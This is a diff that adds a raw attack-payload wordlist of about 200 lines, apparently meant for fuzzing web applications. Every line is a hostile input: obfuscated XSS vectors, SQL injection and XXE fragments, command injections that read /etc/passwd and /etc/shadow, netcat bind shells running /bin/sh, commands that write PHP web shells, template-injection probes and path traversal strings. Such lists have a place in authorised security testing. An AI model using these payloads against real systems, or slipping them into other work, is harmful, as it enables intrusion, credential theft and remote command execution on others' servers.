@@ -1,0 +1,202 @@
+base64&NewLine
+/**/alert(
+alert(0%0)</script
+&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+>test</a>
+&{alert('XSS')}
+XSS</xss:xss></HTML>
+SRC=JaVaScRiPt:alert('XSS')>
+javascript:alert&#x28;1&#x29;'>^__^
+exec cmd="/bin/echo
+new(Image)).src
+script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X
+IPT>alert
+DOCTYPE root
+!--"<XSS>=&{()}
+jypbl SYSTEM
+'); alert('XSS
+ping -c
+onmouseover
+onload\=fetch
+..\\..\\..\\..\\..\\..\
+exec master.dbo
+127.0.0.1
+ENTITY % ubywv SYSTEM
+(select load_file(
+extractvalue(xmltype
+</script><img
+behavior:url(%(sct
+'>//\\,<'>">">"*"
+alert(String.fromCharCode(
+<<<<script
+onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(
+a=/XSS/
+.xml#xss"
+vulnerable=true
+;<;XSS>;=&;{()}
+exec cmd=";/bin/echo
+.js"></script>
+.js'> //|\\ </script
+base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+/**/>/**/alert(1)/**/</script /**/
+{alert(&#039;XSS&#039
++-+-1-+-+alert(1)
+href=j&#97v&#97script&#x3A;&#97lert
+src=j&Tab;a&Tab;
+HREF="htt p:/
+/***/>/***/
+SRC="http://www.
+base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+%(jscript)
+confirm('\
+.js"></SCRIPT>
+@import'%(css
+xss.js></SCRIPT
+onerror=javascript:alert(
+SCRIPT SRC="%(
+%><script>alert(1);</script
+onerror=javascript:alert(1)> -->
+java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script
+background:url('x&#1;;color:red;/*')">XXX
+x2Fjavascript:alert(1)// */</script>
+CLICKME</math>
+onerror=alert(1)>
+%3C%73%63%7
+<br><br><br><br><br><br>
+:alert(1)</script>
+></script onReadyStateChange>
+&#60&#115&#99&#114&
+>javascript:alert(1);</script>
+<script ?>alert(1)
++-+-1-+-+alert(
+>/*<script* */alert(1)
+src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab
+<script //|\\ src='http
+script&#x3A;&#97lert
+alert(document.location)
+src=javaSCRIPT&
+exec%20
+</ScRipT
+>X</script>
+/***/</script /***/
+netstat -a
+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+alert(String.from
+onmouseover=
+EXEC xp_cmdshell
+cat%20/etc/passwd
+javascript:alert('XSS')
+javaSCRIPT&colon
+nid\n
+&Tab;javascript:prompt
+javascript:alert
+/usr/bin/id
+ls -al
+cat ../../
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+ping 127.0.0.1
+| id
+& id
+; id
+%0a id %0a
+$;/usr/bin/id
+curl http
+wget http
+user=\`whoami\`"
+pwd=\`pwd\`"
+shadow=\`grep root /etc/shadow\`"
+uname=\`uname -a\`"
+shell=\`nc -lvvp 1234 
+cat /etc/hosts
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+/bin/cat /etc/passwd
+/bin/cat /etc/shadow
+cmd="/usr/bin/id
+system('cat /etc/passwd')
+php system("cat
+dir C:\
+dir C:\Documents and Settings\
+C:\Users
+echo%20'<script>alert(1)</script>'
+echo "<?php include($_GET[
+echo "<?php include($_GET['page'])| ?>" > rfi.php
+echo "<?php system($_GET['cmd'])| ?>" > cmd.php
+cmd.php
+rfi.php
+echo '<script>alert(1)</script>'
+eval(
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+exec('echo
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+;{$_GET["cmd"]}
+ifconfig
+ipconfig
+ls -l
+ls -laR /etc
+ls -l /home/
+whoami
+\nid|
+\nid;
+\nid\n
+\n/usr/bin/id\n
+-e /bin/sh
+| nc -lvvp 4444 -e /bin/sh|
+; nc -lvvp 4444 -e /bin/sh;
+& nc -lvvp 4444 -e /bin/sh&
+&& nc -lvvp 4444 -e /bin/sh &
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+perl -e
+nc -lvvp 4448 -e /bin/sh&
+php system("echo
+php system("curl
+systeminfo
+type C:\Windows
+C:\Windows
+uname
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+get_user_file("C:\boot.ini") }}
+get_user_file("/etc/
+{{4+4}}
+get_user_file
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+../../../../../
+page=../../
+nano
